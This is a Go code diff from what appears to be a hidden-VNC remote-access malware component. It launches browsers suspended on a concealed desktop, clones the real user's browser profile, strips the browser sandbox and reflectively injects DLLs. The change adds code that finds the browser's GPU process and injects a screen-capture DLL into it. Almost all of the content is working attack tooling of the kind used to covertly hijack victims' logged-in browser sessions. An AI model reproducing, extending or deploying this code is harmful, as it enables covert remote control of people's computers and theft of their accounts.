@@ -35,6 +35,9 @@ var (
 var advapi32 = syscall.NewLazyDLL("advapi32.dll")
 
 type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)
+type DXGIStatusFunc func(success bool, gpuPID uint32, message string)
+
+var hvncDXGIStatusCallback atomic.Value
 
 const (
 	PROCESS_CREATE_THREAD     = 0x0002
@@ -99,7 +102,7 @@ func enableDebugPrivilege() {
 // StartHVNCProcessInjected starts a process suspended on the HVNC desktop,
 // injects the reflective DLL, then resumes it.
 // searchPath/replacePath are passed as environment variables for the DLL hooks.
-func StartHVNCProcessInjected(filePath string, dllBytes []byte, searchPath, replacePath string) error {
+func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) error {
 	if filePath == "" {
 		return fmt.Errorf("empty file path")
 	}
@@ -108,11 +111,12 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, searchPath, repl
 	}
 
 	result, err := executeHVNCTask(hvncTask{
-		kind:        hvncTaskStartProcessInjected,
-		filePath:    filePath,
-		dllBytes:    dllBytes,
-		searchPath:  searchPath,
-		replacePath: replacePath,
+		kind:            hvncTaskStartProcessInjected,
+		filePath:        filePath,
+		dllBytes:        dllBytes,
+		captureDllBytes: captureDllBytes,
+		searchPath:      searchPath,
+		replacePath:     replacePath,
 	}, 30*time.Second)
 	if err != nil {
 		return err
@@ -124,7 +128,10 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, searchPath, repl
 // If clone is true, it clones the real profile so file I/O is redirected to the clone.
 // If clone is false, it starts the browser with injection but no path redirection.
 // browser should be one of: "chrome", "brave", "edge".
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc) error {
+	if onDXGIStatus != nil {
+		hvncDXGIStatusCallback.Store(onDXGIStatus)
+	}
 	info, ok := browserInfoMap[strings.ToLower(browser)]
 	if !ok {
 		return fmt.Errorf("unknown browser %q", browser)
@@ -151,7 +158,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 	if !clone {
 		log.Printf("hvnc %s: starting without profile cloning", info.name)
-		return StartHVNCProcessInjected(exePath, dllBytes, "", "")
+		return StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, "", "")
 	}
 
 	realUserData := getBrowserUserDataDir(info)
@@ -188,12 +195,12 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 		}
 	}
 
-	return StartHVNCProcessInjected(exePath, dllBytes, realUserData, cloneDir)
+	return StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir)
 }
 
 // StartHVNCChromeInjected is kept for backward compatibility.
-func StartHVNCChromeInjected(chromePath string, dllBytes []byte) error {
-	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, true, false, true, nil)
+func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
+	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, nil, nil)
 }
 
 type browserInfo struct {
@@ -660,7 +667,7 @@ func calcDirSize(dir string) int64 {
 	return total
 }
 
-func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, searchPath, replacePath string) error {
+func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) error {
 	if filePath == "" {
 		return fmt.Errorf("empty file path")
 	}
@@ -712,7 +719,168 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, searchPa
 	procCloseHandle.Call(hThread)
 
 	log.Printf("hvnc inject: process PID %d resumed with DLL hooks active", pid)
+
+	if len(captureDllBytes) > 0 {
+		go hvncDeferredGPUInject(pid, captureDllBytes)
+	}
+
 	return nil
+}
+
+func hvncDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
+	time.Sleep(4 * time.Second)
+
+	for attempt := 0; attempt < 15; attempt++ {
+		gpuPID, err := findGPUChildProcess(browserPID)
+		if err != nil {
+			log.Printf("hvnc inject: GPU child not found for PID %d (attempt %d): %v", browserPID, attempt, err)
+			time.Sleep(2 * time.Second)
+			continue
+		}
+
+		log.Printf("hvnc inject: found GPU child process PID %d for browser PID %d", gpuPID, browserPID)
+
+		hProcess, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS_INJ, 0, uintptr(gpuPID))
+		if hProcess == 0 {
+			log.Printf("hvnc inject: failed to open GPU process PID %d", gpuPID)
+			return
+		}
+
+		if err := reflectiveInject(hProcess, captureDllBytes); err != nil {
+			log.Printf("hvnc inject: HVNCCapture DLL injection into GPU PID %d failed: %v", gpuPID, err)
+			procCloseHandle.Call(hProcess)
+			if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+				fn(false, gpuPID, fmt.Sprintf("DXGI injection failed for GPU PID %d", gpuPID))
+			}
+			return
+		}
+		procCloseHandle.Call(hProcess)
+
+		log.Printf("hvnc inject: HVNCCapture DLL injected into GPU PID %d", gpuPID)
+		hvncRegisterInjectedPID(gpuPID)
+		hvncRegisterGPUPID(browserPID, gpuPID)
+		if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+			fn(true, gpuPID, fmt.Sprintf("DXGI capture active (GPU PID %d)", gpuPID))
+		}
+		return
+	}
+
+	log.Printf("hvnc inject: gave up finding GPU child for browser PID %d", browserPID)
+	if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+		fn(false, 0, "DXGI injection failed: GPU process not found")
+	}
+}
+
+func findGPUChildProcess(parentPID uint32) (uint32, error) {
+	children := findChildPIDs(parentPID)
+	if len(children) == 0 {
+		return 0, fmt.Errorf("no child processes")
+	}
+
+	for _, childPID := range children {
+		if hasLoadedModule(childPID, "d3d11.dll") {
+			return childPID, nil
+		}
+	}
+
+	return 0, fmt.Errorf("none of %d children have d3d11.dll", len(children))
+}
+
+type processEntry32W struct {
+	Size            uint32
+	CntUsage        uint32
+	ProcessID       uint32
+	DefaultHeapID   uintptr
+	ModuleID        uint32
+	CntThreads      uint32
+	ParentProcessID uint32
+	PriClassBase    int32
+	Flags           uint32
+	ExeFile         [260]uint16
+}
+
+type moduleEntry32W struct {
+	Size         uint32
+	ModuleID     uint32
+	ProcessID    uint32
+	GlblcntUsage uint32
+	ProccntUsage uint32
+	ModBaseAddr  uintptr
+	ModBaseSize  uint32
+	HModule      uintptr
+	SzModule     [256]uint16
+	SzExePath    [260]uint16
+}
+
+var (
+	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
+	procProcess32FirstW          = kernel32.NewProc("Process32FirstW")
+	procProcess32NextW           = kernel32.NewProc("Process32NextW")
+	procModule32FirstW           = kernel32.NewProc("Module32FirstW")
+	procModule32NextW            = kernel32.NewProc("Module32NextW")
+)
+
+const (
+	TH32CS_SNAPPROCESS  = 0x00000002
+	TH32CS_SNAPMODULE   = 0x00000008
+	TH32CS_SNAPMODULE32 = 0x00000010
+)
+
+func findChildPIDs(parentPID uint32) []uint32 {
+	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
+	if snap == 0 || snap == ^uintptr(0) {
+		return nil
+	}
+	defer procCloseHandle.Call(snap)
+
+	var entry processEntry32W
+	entry.Size = uint32(unsafe.Sizeof(entry))
+	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
+	if ret == 0 {
+		return nil
+	}
+
+	var children []uint32
+	for {
+		if entry.ParentProcessID == parentPID && entry.ProcessID != parentPID {
+			children = append(children, entry.ProcessID)
+		}
+		entry.Size = uint32(unsafe.Sizeof(entry))
+		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
+		if ret == 0 {
+			break
+		}
+	}
+	return children
+}
+
+func hasLoadedModule(pid uint32, moduleName string) bool {
+	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32, uintptr(pid))
+	if snap == 0 || snap == ^uintptr(0) {
+		return false
+	}
+	defer procCloseHandle.Call(snap)
+
+	var entry moduleEntry32W
+	entry.Size = uint32(unsafe.Sizeof(entry))
+	ret, _, _ := procModule32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
+	if ret == 0 {
+		return false
+	}
+
+	target := strings.ToLower(moduleName)
+	for {
+		name := strings.ToLower(syscall.UTF16ToString(entry.SzModule[:]))
+		if name == target {
+			return true
+		}
+		entry.Size = uint32(unsafe.Sizeof(entry))
+		ret, _, _ = procModule32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
+		if ret == 0 {
+			break
+		}
+	}
+	return false
 }
 
 func terminateProcess(hProcess uintptr) {
@@ -771,7 +939,7 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName 
 	}
 	baseName := strings.ToLower(filepath.Base(filePath))
 	if browserExes[baseName] {
-		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu"
+		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu-sandbox"
 	} else if baseName == "firefox.exe" {
 		args += " -no-remote -wait-for-browser"
 	}
